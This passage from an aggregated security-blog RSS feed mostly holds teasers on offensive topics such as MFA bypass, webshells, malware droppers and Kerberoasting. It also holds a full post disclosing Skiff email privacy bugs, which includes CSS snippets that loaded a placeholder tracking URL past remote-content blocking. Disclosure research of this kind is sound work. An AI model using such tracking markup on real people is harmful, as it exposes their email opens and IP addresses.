exploitation technique. This is mostly for when you have already gained admin on the system via other means and want to be able to RDP without needing MFA. Okta MFA Credential Provider for Windows enables strong authentication using MFA with Remote Desktop... &lt;div class="read-more navbutton"&gt;&lt;a href="https://www.n00py.io/2023/02/bypassing-okta-mfa-credential-provider-for-windows/"&gt;Read More&lt;i class="fa fa-angle-double-right"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/div&gt;</description><pubDate>Thu, 16 Feb 2023 10:09:33 +0000</pubDate></item><item><title>Bypassing Amazon Kids+ Parental Controls</title><link>https://www.n00py.io/2023/04/bypassing-amazon-kids-parental-controls/</link><description>Recently for Christmas my 4 year old daughter got an Amazon Kids tablet. So far the tablet has been great and Kids+ seems like a pretty decent value for what you get. I&amp;#8217;m very wary of the types of content available on the internet, and as a parent it&amp;#8217;s my duty to ensure that my... &lt;div class="read-more navbutton"&gt;&lt;a href="https://www.n00py.io/2023/04/bypassing-amazon-kids-parental-controls/"&gt;Read More&lt;i class="fa fa-angle-double-right"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/div&gt;</description><pubDate>Tue, 04 Apr 2023 08:02:16 +0000</pubDate></item><item><title>Simple PHP webshell with php filter chains</title><link>https://malicious.link/posts/2023/simple-php-webshell-with-php-filter-chains/</link><description>Recently found an LFI in a PHP application and one of the cool things I learned about recently was PHP filter chains. More info here: https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html
However, if you are using this in a URL, it&amp;rsquo;s pretty hard to do anything too complicated since it expands the text to the point where web servers won&amp;rsquo;t accept the URL anymore (8190 characters is default max in Apache).
So I used this:</description><pubDate>Sun, 16 Apr 2023 09:00:00 +0000</pubDate></item><item><title>Skiff.com Email's Various Privacy Failures</title><link>https://www.grepular.com/Skiff_Emails_Various_Privacy_Failures</link><description>&lt;p&gt;I came across &lt;a href="https://skiff.com/"&gt;Skiff.com&lt;/a&gt; on a &lt;a href="https://news.ycombinator.com/item?id=37229270"&gt;Hacker News submission&lt;/a&gt;. They claim to provide a “Privacy-first end-to-end encrypted email” service. As the author of the &lt;a href="https://www.emailprivacytester.com"&gt;Email Privacy Tester&lt;/a&gt; I like to test email providers and clients when I first come across them.&lt;/p&gt;
&lt;h3 id="a-bad-default"&gt;A Bad Default&lt;/h3&gt;
&lt;p&gt;One of the first things I noticed after signing up for a free account with Skiff, is that they have the standard “Block Remote Content” option which pretty much all email providers and clients have, but that the option is disabled by default. This default didn’t strike me as matching their “Privacy-first” claim. If privacy is important enough to be the first thing you mention on your website, then blocking remote content should be enabled by default.&lt;/p&gt;
&lt;p&gt;I &lt;a href="https://news.ycombinator.com/item?id=37238112"&gt;mentioned this&lt;/a&gt; on the Hacker News thread, and the CEO of Skiff, Andrew Milich, responded. He had two responses: “privacy focused mail providers offer this as an option but do not enable it by default”. I’d be surprised if that’s the case for privacy focused mail providers, but I haven’t done a survey. But also, “Mainstream mail providers do not even have it as an option”. That’s just flat out false, and I’m not sure why he thinks it. Loading remote content (or not) is a standard option available from nearly all email clients and providers and has been for decades. Also… Who cares what other mail providers do? If “Privacy-first” is your main selling point, do things that are “Privacy-first”, don’t just copy your competitors.&lt;/p&gt;
&lt;h3 id="a-leak-in-the-webmail-osx-and-windows-clients"&gt;A Leak in the Webmail, OSX and Windows clients&lt;/h3&gt;
&lt;p&gt;Anyway, I proceeded to test their webmail client through the Email Privacy Tester to see if it had any bugs. What I discovered was that if you have “Block Remote Content” enabled, they display placeholder images where the remote content would be, as is normal, and the way most other clients work. However, what is different in Skiff’s case, is that they still fetch the remote content in the background. To their credit, they do proxy the requests so that your IP address isn’t exposed, just like GMail does, but email open information is still exposed. This completely defeats the main purpose of blocking remote content and is not how any other mail providers that I’ve tested over the years work.&lt;/p&gt;
&lt;p&gt;I took this back to the same Hacker News thread. The CEO of Skiff responded that what I was saying was “&lt;a href="https://news.ycombinator.com/item?id=37243228"&gt;patently false disinfo&lt;/a&gt;“. Unsure of why he refused to even entertain the idea of the bug, I pointed him to a tool where he could verify this himself (Email Privacy Tester). I received the bizarre response that he tested it and found it worked the same as &lt;a href="https://tutanota.com/"&gt;Tutanota&lt;/a&gt;. I tested Tutanota’s Webmail and no it does not. Tutanota does not have this bug, and unlike Skiff, puts “Privacy-first” and &lt;a href="https://tutanota.com/security"&gt;defaults to blocking remote content&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;At this point, I figured he doesn’t understand the problem, which is fine. What is not fine is the issue being brushed off as “disinformation”, rather than being forwarded to somebody on his team who might be able to understand, diagnose and fix the problem. I created a screencast and &lt;a href="https://www.youtube.com/watch?v=P30Qi2MSbUQ"&gt;uploaded it to Youtube&lt;/a&gt;, showing the bug in action.&lt;/p&gt;
&lt;p&gt;I also tested the OSX and Windows clients and they behave in the same manner.&lt;/p&gt;
&lt;h3 id="ip-address-leak-on-ios"&gt;IP Address Leak, on iOS&lt;/h3&gt;
&lt;p&gt;After testing their iOS client on my iPhone, I discovered that it is even worse than the other clients. First of all, the “Block Remote Content” setting was not synced across so I had to apply it a second time. But the main problem, although they attempt to block remote content from loading on the iOS client when you enable that setting, they fail to do so when that remote content is loaded via one of the following html tags:&lt;/p&gt;
&lt;pre&gt;&lt;code class="lang-html"&gt;&lt;span class="hljs-tag"&gt;&amp;lt;&lt;span class="hljs-name"&gt;p&lt;/span&gt; &lt;span class="hljs-attr"&gt;style&lt;/span&gt;=&lt;span class="hljs-string"&gt;"content:url('http://TRACKING_URL/')"&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class="hljs-tag"&gt;&amp;lt;/&lt;span class="hljs-name"&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt;

&lt;span class="hljs-tag"&gt;&amp;lt;&lt;span class="hljs-name"&gt;p&lt;/span&gt; &lt;span class="hljs-attr"&gt;style&lt;/span&gt;=&lt;span class="hljs-string"&gt;"background-image:url('http://TRACKING_URL/');"&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class="hljs-tag"&gt;&amp;lt;/&lt;span class="hljs-name"&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And in their failure to prevent that loading, they also fail to proxy it, meaning that not only is the fact that you have read that email exposed, but your real IP address is exposed to the sender too. Given Skiff’s lack of interest in my previous report, I didn’t bother reporting this bug to them directly. I haven’t tested their Android client. If you’re using it, I suggest testing it yourself.&lt;/p&gt;
&lt;h3 id="notifying-their-users-"&gt;Notifying their users?&lt;/h3&gt;
&lt;p&gt;Assuming they eventually fix these bugs (who knows?), it will be interesting to see if they email their users to alert them to their potential exposure. Given the attitude of their CEO so far, I’m guessing they will just brush these issues under the rug and not inform their users. Perhaps they will mention it on a webpage somewhere which the majority of their users wont see, so they can claim their users have been informed. Prove me wrong Skiff.&lt;/p&gt;
&lt;h3 id="a-private-way-to-allow-remote-content"&gt;A Private Way to allow Remote Content&lt;/h3&gt;
&lt;p&gt;One of the things the CEO said to me in the thread regarding blocking remote content was “There is no foolproof way to load any remote content without possibly exposing email open information”. I &lt;a href="https://news.ycombinator.com/item?id=37240292"&gt;corrected this&lt;/a&gt;, and didn’t get a response. It is totally possible to load remote content at the same time as hiding email open information. You would do this by fetching and storing the remote content at the point of delivery, for all email. I don’t know of any providers that do this, but it is certainly a solution to the problem and one that I hope providers start to use one day. Certainly providers who claim to be “Privacy-first”. If all providers started doing this, it would drastically reduce the ability of senders to track email; they’d have to rely on users clicking links containing unique ids.&lt;/p&gt;
&lt;h3 id="security-audits"&gt;Security Audits&lt;/h3&gt;
&lt;p&gt;According to Skiff’s &lt;a href="https://skiff.com/transparency"&gt;Transparency page&lt;/a&gt; they’ve undergone and are undergoing four security audits:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Cure53    Aug 2023 (Upcoming)&lt;/li&gt;
&lt;li&gt;Trail of Bits    July 2022&lt;/li&gt;
&lt;li&gt;Trail of Bits    Feb 2022&lt;/li&gt;
&lt;li&gt;Tom Ritter (Security Consultant)    Jan 2021 &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;They don’t provide any further information, so we really have no idea what was actually tested as part of these audits, nor what the results were. I can only assume they haven’t had their webmail client or desktop apps audited to ensure that they’re working as intended; even basic testing of the “Block Remote Content” function would have shown a problem. Security Auditors, take note: If you’re testing something related to email, Email Privacy Tester exists, and it’s GPL-3, so you can even &lt;a href="https://gitlab.com/mikecardwell/ept3"&gt;host your own version&lt;/a&gt;.&lt;/p&gt;
&lt;h3 id="mta-sts"&gt;MTA-STS&lt;/h3&gt;
&lt;p&gt;I also tested if they support &lt;a href="https://www.ncsc.gov.uk/collection/email-security-and-anti-spoofing/using-mta-sts-to-protect-the-privacy-of-your-emails"&gt;MTA-STS&lt;/a&gt;. Here, they’ve done half a job. They support it for inbound mail, but not outbound. I confirmed this by disabling the advertising of STARTTLS on my MTA, to their hosts only, and testing if they still delivered mail to my address (which has MTA-STS set up on it). Here is a log of them delivering mail to me over a TLS secured connection before I made the change, followed by a log of them delivering mail to me over a non-TLS connection after I made it:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span class="hljs-number"&gt;2023&lt;/span&gt;&lt;span class="hljs-number"&gt;-08&lt;/span&gt;&lt;span class="hljs-number"&gt;-25&lt;/span&gt; &lt;span class="hljs-number"&gt;18&lt;/span&gt;:&lt;span class="hljs-number"&gt;06&lt;/span&gt;:&lt;span class="hljs-number"&gt;51&lt;/span&gt; &lt;span class="hljs-number"&gt;1&lt;/span&gt;qZbCq&lt;span class="hljs-number"&gt;-00000&lt;/span&gt;C&lt;span class="hljs-number"&gt;-0&lt;/span&gt;T &amp;lt;= mike.&lt;span class="hljs-symbol"&gt;cardwell@&lt;/span&gt;skiff.com H=outbound-smtp.skiff.com [&lt;span class="hljs-number"&gt;35.166&lt;/span&gt;&lt;span class="hljs-number"&gt;.143&lt;/span&gt;&lt;span class="hljs-number"&gt;.94&lt;/span&gt;]:&lt;span class="hljs-number"&gt;47782&lt;/span&gt; I=[&lt;span class="hljs-number"&gt;172.19&lt;/span&gt;&lt;span class="hljs-number"&gt;.0&lt;/span&gt;&lt;span class="hljs-number"&gt;.3&lt;/span&gt;]:&lt;span class="hljs-number"&gt;25&lt;/span&gt; P=esmtps X=TLS1&lt;span class="hljs-number"&gt;.2&lt;/span&gt;:ECDHE_RSA_AES_256_GCM_SHA384:&lt;span class="hljs-number"&gt;256&lt;/span&gt; CV=no SNI=&lt;span class="hljs-string"&gt;"mail.grepular.com"&lt;/span&gt; S=&lt;span class="hljs-number"&gt;2612&lt;/span&gt; id=c4588db9&lt;span class="hljs-number"&gt;-741e-4&lt;/span&gt;c6d-a1d4&lt;span class="hljs-number"&gt;-490432f&lt;/span&gt;&lt;span class="hljs-symbol"&gt;7cdc6@&lt;/span&gt;mail.skiff.com

&lt;span class="hljs-number"&gt;2023&lt;/span&gt;&lt;span class="hljs-number"&gt;-08&lt;/span&gt;&lt;span class="hljs-number"&gt;-26&lt;/span&gt; &lt;span class="hljs-number"&gt;15&lt;/span&gt;:&lt;span class="hljs-number"&gt;37&lt;/span&gt;:&lt;span class="hljs-number"&gt;49&lt;/span&gt; &lt;span class="hljs-number"&gt;1&lt;/span&gt;qZvM8&lt;span class="hljs-number"&gt;-00000&lt;/span&gt;A-TS &amp;lt;= mike.&lt;span class="hljs-symbol"&gt;cardwell@&lt;/span&gt;skiff.com H=outbound-smtp.skiff.com [&lt;span class="hljs-number"&gt;35.166&lt;/span&gt;&lt;span class="hljs-number"&gt;.143&lt;/span&gt;&lt;span class="hljs-number"&gt;.94&lt;/span&gt;]:&lt;span class="hljs-number"&gt;36226&lt;/span&gt; I=[&lt;span class="hljs-number"&gt;172.22&lt;/span&gt;&lt;span class="hljs-number"&gt;.0&lt;/span&gt;&lt;span class="hljs-number"&gt;.4&lt;/span&gt;]:&lt;span class="hljs-number"&gt;25&lt;/span&gt; P=esmtp S=&lt;span class="hljs-number"&gt;2568&lt;/span&gt; id=f1f681b6&lt;span class="hljs-number"&gt;-0161&lt;/span&gt;&lt;span class="hljs-number"&gt;-45&lt;/span&gt;a0&lt;span class="hljs-number"&gt;-834&lt;/span&gt;c&lt;span class="hljs-number"&gt;-1&lt;/span&gt;&lt;span class="hljs-symbol"&gt;ab8f8b86361@&lt;/span&gt;mail.skiff.com
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Come on, finish the job Skiff.&lt;/p&gt;
&lt;h3 id="dmarc-and-spoofing"&gt;DMARC and Spoofing&lt;/h3&gt;
&lt;p&gt;I tested if they support DMARC by sending an email to my Skiff address from an IP outside my SPF allow-list, and without a DKIM signature. According to my DMARC record, they should have rejected the email, but instead of rejecting, they treated it as if I specified “quarantine” and placed it in the Spam folder. I can’t see from the outside if failing DMARC will always lead to a message being filtered into Spam, or if they simply treat it as just another Spam indicator. Hopefully, an email which fails DMARC will &lt;em&gt;always&lt;/em&gt; go into the Spam folder at least. The main problem is, this email was spoofed, and there is nothing in the UI to indicate that was the case, to the reader.&lt;/p&gt;
&lt;h3 id="summary"&gt;Summary&lt;/h3&gt;
&lt;p&gt;The existence of bugs is to be expected, but the attitude of Skiffs CEO towards them being reported is not. All he needed to say to me was, “Thanks for the report. It’s not supposed to work that way. I’ll get somebody to look into it”. Therefore, I would recommend you not trust this company with your data. You never know what legitimate privacy/security bug reports they have dismissed in the past, or will dismiss in the future. I will update this blog post if I become aware of them fixing any of these issues.&lt;/p&gt;
&lt;h3 id="update-2023-aug-29"&gt;Update 2023-Aug-29&lt;/h3&gt;
&lt;p&gt;They have fixed the IP address leak on iOS. No sign of users being informed of their exposure. Other issues remain.&lt;/p&gt;</description><pubDate>Sun, 27 Aug 2023 15:43:17 +0000</pubDate></item><item><title>The Mac Malware of 2023</title><link>https://objective-see.org/blog/blog_0x77.html</link><description>It's here! Our annual report on all the Mac malware of the year (2023 edition). Besides providing samples for download, we cover infection vectors, persistence mechanisms, payloads and more!</description><pubDate>Mon, 01 Jan 2024 00:00:00 +0000</pubDate></item><item><title>Analyzing DPRK's SpectralBlur</title><link>https://objective-see.org/blog/blog_0x78.html</link><description>The first malware of 2024 is (already) here. Let's dive in!</description><pubDate>Thu, 04 Jan 2024 00:00:00 +0000</pubDate></item><item><title>The SOCKS We Have at Home</title><link>https://www.n00py.io/2024/01/the-socks-we-have-at-home/</link><description>Introduction When performing penetration tests, we sometimes find that the systems or data we are targeting are not directly accessible from the network our attacking system is connected to. This is often the case when searching for things such a PCI data. We may have ‘owned’ the network, we may have gotten ‘DA’, but we... &lt;div class="read-more navbutton"&gt;&lt;a href="https://www.n00py.io/2024/01/the-socks-we-have-at-home/"&gt;Read More&lt;i class="fa fa-angle-double-right"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/div&gt;</description><pubDate>Fri, 05 Jan 2024 16:28:04 +0000</pubDate></item><item><title>Why Join The Navy If You Can Be A Pirate?</title><link>https://objective-see.org/blog/blog_0x79.html</link><description>From a security point of view, pirating software is not recommended! Let's analyze a pirated application that contains a (malicious) surprise.</description><pubDate>Mon, 15 Jan 2024 00:00:00 +0000</pubDate></item><item><title>Apple Gets an 'F' for Slicing Apples</title><link>https://objective-see.org/blog/blog_0x80.html</link><description>Universal binaries contain multiple architecture-specific Mach-O, known as slices ...however, it turns out the Apple API to identify the best slice is broken. Let's investigate and find out why!</description><pubDate>Thu, 22 Feb 2024 00:00:00 +0000</pubDate></item><item><title>This Meeting Should Have Been an Email</title><link>https://objective-see.org/blog/blog_0x7A.html</link><description>A DPRK stealer, dubbed BeaverTail, targets users via a trojanized meeting app. Let's analyze it comprehensively.</description><pubDate>Sat, 15 Jun 2024 00:00:00 +0000</pubDate></item><item><title>The Hidden Treasures of Crash Reports</title><link>https://objective-see.org/blog/blog_0x7B.html</link><description>Analyzing crash reports reveals malware, (0-day) bugs, and much more!</description><pubDate>Tue, 13 Aug 2024 00:00:00 +0000</pubDate></item><item><title>Sending Email Using Curl</title><link>https://www.grepular.com/Sending_Email_Using_Curl</link><description>&lt;p&gt;I have a Gitlab runner which runs every day, and sometimes builds and pushes a new docker image if a new version of some software has been released. I wanted to update it to send me an email after pushing an image. I didn’t find any options in Dockerhub or Gitlab to do this. Dockerhub lets you call out to a webhook, so I guess I could do something with IFTTT or similar but I really didn’t want to have to sign up to another service to handle this.&lt;/p&gt;
&lt;p&gt;Turns out curl can be used to send an email, and it’s pretty trivial. Curl is already installed inside my gitlab runner because I needed it as part of the build. I already have an authenticated SMTP server:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span class="hljs-string"&gt;curl &lt;/span&gt;&lt;span class="hljs-built_in"&gt;--ssl-reqd&lt;/span&gt; \
     &lt;span class="hljs-built_in"&gt;--url&lt;/span&gt;       &lt;span class="hljs-string"&gt;"smtps://mail.example.com:465"&lt;/span&gt; \
     &lt;span class="hljs-built_in"&gt;--user&lt;/span&gt;      &lt;span class="hljs-string"&gt;"username:password"&lt;/span&gt; \
     &lt;span class="hljs-built_in"&gt;--mail-from&lt;/span&gt; &lt;span class="hljs-string"&gt;"postmaster@example.com"&lt;/span&gt; \
     &lt;span class="hljs-built_in"&gt;--mail-rcpt&lt;/span&gt; &lt;span class="hljs-string"&gt;"postmaster@example.com"&lt;/span&gt; \
     &lt;span class="hljs-built_in"&gt;--upload-file&lt;/span&gt; &amp;lt;(&lt;span class="hljs-string"&gt;echo &lt;/span&gt;-e &lt;span class="hljs-string"&gt;"Subject: New $IMAGE_NAME:$IMAGE_VERSION tag pushed\n\nSee subject. Sent from gitlab runner"&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I used environment variables configured in gitlab for the creds, sender and rcpt email rather than hardcoding them in a public git repo, for obvious reasons.&lt;/p&gt;
&lt;p&gt;Then I waited. I wasn’t sure if this would work initially as for all I knew gitlab would block outgoing port 465 from it’s runners. It doesn’t though. The next time a new version of sqlite3 was released I received the email alerting me to that fact.&lt;/p&gt;</description><pubDate>Sat, 07 Dec 2024 17:00:35 +0000</pubDate></item><item><title>A Practical Guide to Confidential Computing</title><link>https://trustfoundry.net/2024/12/11/a-practical-guide-to-confidential-computing/</link><description>&lt;p&gt;Recently, I threat-modeled an environment where a sensitive machine would run a customer-supplied agent. This...&lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://trustfoundry.net/2024/12/11/a-practical-guide-to-confidential-computing/"&gt;A Practical Guide to Confidential Computing&lt;/a&gt; appeared first on &lt;a href="https://trustfoundry.net"&gt;TrustFoundry&lt;/a&gt;.&lt;/p&gt;</description><pubDate>Wed, 11 Dec 2024 14:33:56 +0000</pubDate></item><item><title>Restoring Reflective Code Loading on macOS</title><link>https://objective-see.org/blog/blog_0x7C.html</link><description>Apple silently 'broke' in-memory code loading on macOS ...let's restore it!</description><pubDate>Mon, 16 Dec 2024 00:00:00 +0000</pubDate></item><item><title>Enumerating Access for AWS Temporary Credentials</title><link>https://trustfoundry.net/2024/12/17/enumerating-access-for-aws-temporary-credentials/</link><description>&lt;p&gt;Enumerating Access for AWS Temporary Credentials I recently came across a scenario where I had...&lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://trustfoundry.net/2024/12/17/enumerating-access-for-aws-temporary-credentials/"&gt;Enumerating Access for AWS Temporary Credentials&lt;/a&gt; appeared first on &lt;a href="https://trustfoundry.net"&gt;TrustFoundry&lt;/a&gt;.&lt;/p&gt;</description><pubDate>Tue, 17 Dec 2024 15:10:44 +0000</pubDate></item><item><title>The Mac Malware of 2024</title><link>https://objective-see.org/blog/blog_0x7D.html</link><description>It's here! Our annual report on all the Mac malware of the year (2024 edition). Besides providing samples for download, we cover infection vectors, persistence mechanisms, payloads and more!</description><pubDate>Wed, 01 Jan 2025 00:00:00 +0000</pubDate></item><item><title>Harnessing Blockchain for Secure and Transparent Elections</title><link>https://trustfoundry.net/2025/01/06/harnessing-blockchain-for-secure-and-transparent-elections/</link><description>&lt;p&gt;Blockchain technologies power cryptocurrencies like Bitcoin. They are a decentralized, transparent technology that has the...&lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://trustfoundry.net/2025/01/06/harnessing-blockchain-for-secure-and-transparent-elections/"&gt;Harnessing Blockchain for Secure and Transparent Elections&lt;/a&gt; appeared first on &lt;a href="https://trustfoundry.net"&gt;TrustFoundry&lt;/a&gt;.&lt;/p&gt;</description><pubDate>Mon, 06 Jan 2025 13:39:24 +0000</pubDate></item><item><title>A Mere Mortal’s Introduction to JIT Vulnerabilities in JavaScript Engines</title><link>https://trustfoundry.net/2025/01/14/a-mere-mortals-introduction-to-jit-vulnerabilities-in-javascript-engines/</link><description>&lt;p&gt;Intro: There are some people who seem to have a mysterious ability to grasp complex...&lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://trustfoundry.net/2025/01/14/a-mere-mortals-introduction-to-jit-vulnerabilities-in-javascript-engines/"&gt;A Mere Mortal&amp;#8217;s Introduction to JIT Vulnerabilities in JavaScript Engines&lt;/a&gt; appeared first on &lt;a href="https://trustfoundry.net"&gt;TrustFoundry&lt;/a&gt;.&lt;/p&gt;</description><pubDate>Tue, 14 Jan 2025 12:59:32 +0000</pubDate></item><item><title>BurpSuite’s New AI Features: Are they as AI-mazing as they sound!?</title><link>https://trustfoundry.net/2025/03/03/burpsuites-new-ai-features-are-they-as-ai-mazing-as-they-sound-2/</link><description>&lt;p&gt;BurpSuite&amp;#8217;s New AI Features: Are they as AI-mazing as they sound!? Whilst it seems like...&lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://trustfoundry.net/2025/03/03/burpsuites-new-ai-features-are-they-as-ai-mazing-as-they-sound-2/"&gt;BurpSuite&amp;#8217;s New AI Features: Are they as AI-mazing as they sound!?&lt;/a&gt; appeared first on &lt;a href="https://trustfoundry.net"&gt;TrustFoundry&lt;/a&gt;.&lt;/p&gt;</description><pubDate>Mon, 03 Mar 2025 14:28:57 +0000</pubDate></item><item><title>Blocking Russian IPs</title><link>https://www.grepular.com/Blocking_Russian_IPs</link><description>&lt;p&gt;You might run some websites behind Nginx on Debian 12 and you might find yourself wanting to block requests from Russian IPs. It’s trivial. Here’s how to do it:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span class="hljs-comment"&gt;# apt install libnginx-mod-http-geoip&lt;/span&gt;
&lt;span class="hljs-comment"&gt;# echo "geoip_country /usr/share/GeoIP/GeoIP.dat;" &amp;gt; /etc/nginx/conf.d/geoip.conf&lt;/span&gt;
&lt;span class="hljs-comment"&gt;# cat &amp;lt;&amp;lt; EOF &amp;gt; /etc/nginx/cc-block.conf&lt;/span&gt;
&lt;span class="hljs-keyword"&gt;if&lt;/span&gt; (&lt;span class="hljs-variable"&gt;$geoip_country_code3&lt;/span&gt; = &lt;span class="hljs-string"&gt;"RUS"&lt;/span&gt;) {
    rewrite / /&lt;span class="hljs-built_in"&gt;block-russia&lt;/span&gt;;
}

location /&lt;span class="hljs-built_in"&gt;block-russia&lt;/span&gt; {
    default_type text/plain;
    &lt;span class="hljs-keyword"&gt;return&lt;/span&gt; &lt;span class="hljs-number"&gt;200&lt;/span&gt; &lt;span class="hljs-string"&gt;'Russian IPs are blocked here, due to your unjust and unprovoked War against Ukraine.'&lt;/span&gt;;
}
EOF
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now for each of the vhosts in /etc/conf.d/sites-enabled/ that you want to block access for, just add “include cc-block.conf;” inside the server block. Then of course, do an “nginx -t” to test your config and a “service nginx reload” to load the changes.&lt;/p&gt;
&lt;p&gt;You can test what your website looks like from different IPs using &lt;a href="https://geotargetly.com/geo-browse"&gt;https://geotargetly.com/geo-browse&lt;/a&gt;&lt;/p&gt;</description><pubDate>Thu, 06 Mar 2025 23:42:30 +0000</pubDate></item><item><title>Spot the Bug Challenge 1</title><link>https://trustfoundry.net/2025/03/12/spot-the-bug-challenge-1/</link><description>&lt;p&gt;Intro Near the end of 2024, TrustFoundry introduced a game called &amp;#8220;spot the bug&amp;#8221; to...&lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://trustfoundry.net/2025/03/12/spot-the-bug-challenge-1/"&gt;Spot the Bug Challenge 1&lt;/a&gt; appeared first on &lt;a href="https://trustfoundry.net"&gt;TrustFoundry&lt;/a&gt;.&lt;/p&gt;</description><pubDate>Wed, 12 Mar 2025 17:02:56 +0000</pubDate></item><item><title>Capchan – Solving CAPTCHA with Image Classification</title><link>https://sensepost.com/blog/2025/capchan-solving-captcha-with-image-classification/</link><description>A few years ago, I tried my hand at the, now retired, CAPTCHA Forest CTF, which was part of the nullcon HackIM 2019. I wanted to solve it using computer vision and machine learning. This started me on a path of discovery and incremental improvements that finally resulted in capchan, a generic CAPTCHA to text tool.</description><pubDate>Thu, 13 Mar 2025 14:44:49 +0000</pubDate></item><item><title>NoSQL error-based injection</title><link>https://sensepost.com/blog/2025/nosql-error-based-injection/</link><description>TL;DR How to do NoSQL error-based injection</description><pubDate>Sat, 15 Mar 2025 15:54:46 +0000</pubDate></item><item><title>Using &amp; improving frida-trace</title><link>https://sensepost.com/blog/2025/using-improving-frida-trace/</link><description>TL;DR In this blog I want to show you how useful frida-trace can be at hooking thousands of methods at a time. I also wrote some scripts for improving its output a bit.</description><pubDate>Wed, 19 Mar 2025 08:01:41 +0000</pubDate></item><item><title>Leaking Passwords (and more!) on macOS</title><link>https://objective-see.org/blog/blog_0x7E.html</link><description>In this guest blog post, researcher Noah Gregory shares the technical details of a bug he uncovered (that was subsequently patched by Apple as CVE-2024-5447).</description><pubDate>Thu, 20 Mar 2025 00:00:00 +0000</pubDate></item><item><title>Leakymetry: Circumventing GLPI Authentication</title><link>https://sensepost.com/blog/2025/leakymetry-circumventing-glpi-authentication/</link><description>Intro</description><pubDate>Fri, 21 Mar 2025 10:10:56 +0000</pubDate></item><item><title>Spot the Bug Challenge 2</title><link>https://trustfoundry.net/2025/03/21/spot-the-bug-challenge-2/</link><description>&lt;p&gt;Intro: If you missed our first post introducing the Spot the Bug game, be sure...&lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://trustfoundry.net/2025/03/21/spot-the-bug-challenge-2/"&gt;Spot the Bug Challenge 2&lt;/a&gt; appeared first on &lt;a href="https://trustfoundry.net"&gt;TrustFoundry&lt;/a&gt;.&lt;/p&gt;</description><pubDate>Fri, 21 Mar 2025 12:38:01 +0000</pubDate></item><item><title>Browser Cache Smuggling: the return of the dropper</title><link>https://sensepost.com/blog/2025/browser-cache-smuggling-the-return-of-the-dropper/</link><description>A year and a half ago I wrote a blog post describing how browsers&amp;amp;#x2019; cache system can be abused to drop malware on targets&amp;amp;#x2019; computers. As of today, this technique is still relevant. Browsers haven&amp;amp;#x2019;t changed their behaviour and as such you can still use it for red team assessments.</description><pubDate>Mon, 24 Mar 2025 08:25:35 +0000</pubDate></item><item><title>TCCing is Believing: Apple finally adds TCC events to Endpoint Security!</title><link>https://objective-see.org/blog/blog_0x7F.html</link><description>Apple will bring TCC events to Endpoint Security in macOS 15.4. In this post, we covers details, nuances, and provide PoC code for the new 'ES_EVENT_TYPE_NOTIFY_TCC_MODIFY' event.</description><pubDate>Thu, 27 Mar 2025 00:00:00 +0000</pubDate></item><item><title>Browser Exploitation Basics – Explaining the addrof and fakeobj Primitives</title><link>https://trustfoundry.net/2025/03/28/browser-exploitation-basics-explaining-the-addrof-and-fakeobj-primitives/</link><description>&lt;p&gt;Intro When learning basic JavaScript (JS) engine exploitation, I found that I really struggled with...&lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://trustfoundry.net/2025/03/28/browser-exploitation-basics-explaining-the-addrof-and-fakeobj-primitives/"&gt;Browser Exploitation Basics &amp;#8211; Explaining the addrof and fakeobj Primitives&lt;/a&gt; appeared first on &lt;a href="https://trustfoundry.net"&gt;TrustFoundry&lt;/a&gt;.&lt;/p&gt;</description><pubDate>Fri, 28 Mar 2025 13:47:21 +0000</pubDate></item><item><title>Fare Play: See the Movie for Free by Kerberoasting Service Tickets Through an AS-REPRoastable User</title><link>https://trustfoundry.net/2025/04/04/fare-play-see-the-movie-for-free-by-kerberoasting-service-tickets-through-an-as-reproastable-user/</link><description>&lt;p&gt;Kerberos ticket abuse is a significant issue for organizations that use Active Directory. Kerberos is...&lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://trustfoundry.net/2025/04/04/fare-play-see-the-movie-for-free-by-kerberoasting-service-tickets-through-an-as-reproastable-user/"&gt;Fare Play: See the Movie for Free by Kerberoasting Service Tickets Through an AS-REPRoastable User&lt;/a&gt; appeared first on &lt;a href="https://trustfoundry.net"&gt;TrustFoundry&lt;/a&gt;.&lt;/p&gt;</description><pubDate>Fri, 04 Apr 2025 13:41:11 +0000</pubDate></item><item><title>Is TLS more secure? The WinRMS case.</title><link>https://sensepost.com/blog/2025/is-tls-more-secure-the-winrms-case./</link><description>0/ TL;DR</description><pubDate>Mon, 14 Apr 2025 09:07:33 +0000</pubDate></item><item><title>Intercepting HTTPS Communication in Flutter: Going Full Hardcore Mode with Frida</title><link>https://sensepost.com/blog/2025/intercepting-https-communication-in-flutter-going-full-hardcore-mode-with-frida/</link><description>tl;dr In this blog post, I will share insights I learned while researching the Flutter framework and the reFlutter tool. It will dive deep into Flutter&amp;amp;#x2019;s architecture, some of its inner workings and dependencies, and finally, drill down into the SSL verification logic. The post will end by exploring what the reFlutter tool actually does and my attempts at replicating the same behaviour with Frida.</description><pubDate>Wed, 16 Apr 2025 16:26:33 +0000</pubDate></item><item><title>Investigating an in-the-wild campaign using RCE in CraftCMS</title><link>https://sensepost.com/blog/2025/investigating-an-in-the-wild-campaign-using-rce-in-craftcms/</link><description>Introduction</description><pubDate>Fri, 18 Apr 2025 17:31:39 +0000</pubDate></item><item><title>Identifying New Attack Paths via Password 